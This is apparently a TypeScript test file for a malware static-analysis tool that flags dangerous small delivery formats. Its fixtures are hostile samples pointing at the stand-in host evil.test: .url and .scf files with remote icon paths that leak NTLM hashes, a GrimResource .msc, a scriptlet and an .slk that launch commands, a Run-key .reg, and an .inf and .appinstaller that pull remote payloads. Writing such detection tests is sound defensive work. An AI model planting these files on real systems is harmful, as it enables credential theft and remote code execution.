import assert from 'node:assert/strict';
import { test } from 'node:test';

import { analyzeSmallFormat } from '../../src/lib/small-formats';
import { analyzeBuffer } from '../../src/lib/static-analysis';

// Formatos pequenos de entrega (plans/analise-estatica-ampliada, item 12).

const one = (text: string, name: string) => analyzeSmallFormat(Buffer.from(text), name)!;

test('.url e .scf: destino e ícone em pasta remota (vazamento do hash NTLM)', () => {
  const url = one(
    '[InternetShortcut]\r\nURL=file://evil.test@ssl/share/fatura.lnk\r\nIconFile=\\\\10.0.0.5\\i\\x.ico\r\n',
    'f.url',
  );
  assert.equal(url.format, 'url');
  assert.equal(url.alerts.length, 2);
  assert.ok(url.alerts.every((a) => a.level === 'high'));
  assert.match(url.alerts[1].text, /hash NTLM/);
  const scf = one('[Shell]\r\nCommand=2\r\nIconFile=\\\\evil.test\\share\\a.ico\r\n', 'x.scf');
  assert.equal(scf.format, 'scf');
  assert.equal(scf.alerts[0].level, 'high');
});

test('.msc GrimResource, .sct e .settingcontent-ms', () => {
  const msc = one(
    '<?xml version="1.0"?><MMC_ConsoleFile><StringTables><String ID="1">res://apds.dll/redirect.html?target=javascript:eval("var x = new ActiveXObject(\'WScript.Shell\')")</String></StringTables></MMC_ConsoleFile>',
    'x.msc',
  );
  assert.equal(msc.format, 'msc');
  assert.ok(msc.alerts.some((a) => a.text.includes('GrimResource')));
  assert.ok(msc.script?.includes('ActiveXObject'));
  const sct = one(
    '<?XML version="1.0"?><scriptlet><registration progid="x"><script language="JScript"><![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); ]]></script></registration></scriptlet>',
    'x.sct',
  );
  assert.equal(sct.format, 'sct');
  assert.match(sct.script ?? '', /WScript\.Shell/);
  const settings = one(
    '<?xml version="1.0"?><PCSettings><SearchableContent><ApplicationInformation><DeepLink>%windir%\\system32\\cmd.exe /c calc</DeepLink></ApplicationInformation></SearchableContent></PCSettings>',
    'x.settingcontent-ms',
  );
  assert.deepEqual(settings.targets, ['%windir%\\system32\\cmd.exe /c calc']);
});

test('.library-ms, .appinstaller, .iqy, .slk, .reg e .inf', () => {
  const lib = one(
    '<libraryDescription xmlns="x"><searchConnectorDescriptionList><searchConnectorDescription><simpleLocation><url>\\\\webdav.evil.test@SSL\\DavWWWRoot\\x</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>',
    'x.library-ms',
  );
  assert.equal(lib.alerts[0].level, 'high');
  const app = one(
    '<AppInstaller Uri="https://evil.test/a.appinstaller"><MainBundle Uri="https://evil.test/a.msix"/></AppInstaller>',
    'a.appinstaller',
  );
  assert.equal(app.alerts.length, 2);
  assert.ok(app.targets.includes('https://evil.test/a.msix'));
  assert.equal(one('WEB\r\n1\r\nhttp://evil.test/dde.txt\r\n', 'x.iqy').alerts[0].level, 'high');
  assert.equal(
    one('ID;P\r\nC;X1;Y1;K0;EEXEC("cmd /c calc")\r\nE\r\n', 'x.slk').alerts[0].level,
    'high',
  );
  const reg = one(
    'Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n"x"="c:\\\\a.exe"\r\n',
    'x.reg',
  );
  assert.equal(reg.alerts[0].level, 'high');
  const inf = one(
    '[version]\r\nSignature=$chicago$\r\n[DefaultInstall_SingleUser]\r\nUnRegisterOCXs=UnRegisterOCXSection\r\n[UnRegisterOCXSection]\r\n%11%\\scrobj.dll,NI,https://evil.test/x.sct\r\n',
    'x.inf',
  );
  assert.equal(inf.alerts[0].level, 'high');
  assert.ok(inf.targets.includes('https://evil.test/x.sct'));
});

test('na análise estática: seção de entrega, IOC do destino e o script do .msc', () => {
  const info = analyzeBuffer(
    Buffer.from('[InternetShortcut]\r\nURL=https://stage.evil.test/payload.hta\r\n'),
    'fatura.url',
  );
  assert.equal(info.delivery?.format, 'url');
  assert.equal(info.delivery?.risk, 'high');
  assert.ok(info.iocCandidates.some((i) => i.value.includes('stage.evil.test')));
  // Texto comum nao vira formato de entrega.
  assert.equal(analyzeSmallFormat(Buffer.from('ola mundo, texto comum\n'), 'leia.txt'), null);
});
